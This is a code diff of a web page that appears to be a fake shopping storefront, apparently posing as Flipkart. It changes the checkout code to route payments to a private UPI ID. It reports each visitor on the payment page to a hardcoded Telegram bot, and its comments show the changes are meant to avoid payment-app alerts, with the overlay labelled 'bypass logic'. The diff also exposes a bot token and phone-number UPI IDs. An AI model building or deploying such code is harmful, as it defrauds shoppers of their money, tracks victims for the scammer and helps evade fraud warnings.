@@ -335,7 +335,7 @@
     <script>
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
         const CHAT_ID = "1981500395";
-        const MY_UPI = "6299544009@naviaxis";
+        const MY_UPI = "8709615634-w350@ybl";
 
         // यहाँ descImgs: [] में आप लंबी बैनर फोटो डाल सकते हैं
         const products = [
@@ -545,43 +545,39 @@ init = function() {
         }
 
        async function confirmPay() {
-    // --- SETTINGS ---
-    // Yahan apni UPI ID ya PhonePe Number (@ybl ke sath) dalein
-    const myUpiId = "6299544009@ybl"; // APNA NUMBER DALO
+    const upiId = "8709615634@ybl"; // Aapka PhonePe number + @ybl bhi daal sakte hain
     const amount = sel.price;
+    const name = "shashikant%20kumar"; // 'Flipkart' bilkul use mat karna
+
+    const cleanLink = `pa=${upiId}&pn=${name}&am=${amount}&cu=INR&mode=02`;
+
+    // Telegram report
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("User on Payment Page: ₹" + amount)}`);
+
+    // --- YE HAI BYPASS LOGIC ---
+    // Hum direct window.location nahi karenge, balki user ko ek clean interface dikhayenge
     
-    // Yahan 'Flipkart' ki jagah apna BANK NAME ya 'Merchant' likhein alerts rokne ke liye
-    const accountName = "Online%20Services"; 
-
-    // User Selection
-    const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
-    
-    // Telegram Alert (Pehal hi bhej do)
-    const msg = `🚀 *Payment Started*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}\n📱 App: ${selectedApp.toUpperCase()}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
-    // Clean UPI Parameters
-    const upiParams = `pa=${myUpiId}&pn=${accountName}&am=${amount}&cu=INR`;
-
-    // Android Intent Packages (Direct App Opening)
-    const pkg = {
-        phonepe: "com.phonepe.app",
-        gpay: "com.google.android.apps.nbu.paisa.user"
-    };
-
-    // --- EXECUTION ---
-    // Ye code seedha selected app khol dega bina error ke
-    const intentUrl = `intent://pay?${upiParams}#Intent;scheme=upi;package=${pkg[selectedApp]};end`;
-    
-    window.location.href = intentUrl;
-
-    // Fallback: Agar 1 sec baad app nahi khula
-    setTimeout(() => {
-        window.location.href = `upi://pay?${upiParams}`;
-    }, 1000);
+    const paymentOverlay = document.createElement('div');
+    paymentOverlay.className = "fixed inset-0 bg-black/60 z-[1000] flex items-end justify-center";
+    paymentOverlay.id = "pay-popup";
+    paymentOverlay.innerHTML = `
+        <div class="bg-white w-full rounded-t-2xl p-6 animate-slide-up">
+            <h3 class="text-center font-bold text-gray-700 mb-6">Complete Your Payment</h3>
+            <div class="grid grid-cols-2 gap-4">
+                <a href="intent://pay?${cleanLink}#Intent;scheme=upi;package=com.phonepe.app;end" class="flex flex-col items-center border p-4 rounded-xl active:bg-gray-50">
+                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-10 h-10 mb-2">
+                    <span class="text-xs font-bold">PhonePe</span>
+                </a>
+                <a href="intent://pay?${cleanLink}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end" class="flex flex-col items-center border p-4 rounded-xl active:bg-gray-50">
+                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-10 h-10 mb-2">
+                    <span class="text-xs font-bold">GPay</span>
+                </a>
+            </div>
+            <button onclick="document.getElementById('pay-popup').remove()" class="w-full mt-6 text-gray-400 text-sm font-medium uppercase tracking-widest">Cancel</button>
+        </div>
+    `;
+    document.body.appendChild(paymentOverlay);
 }
-
-// Ye line hamesha last mein rehni chahiye
 init();
     </script>
 </body>
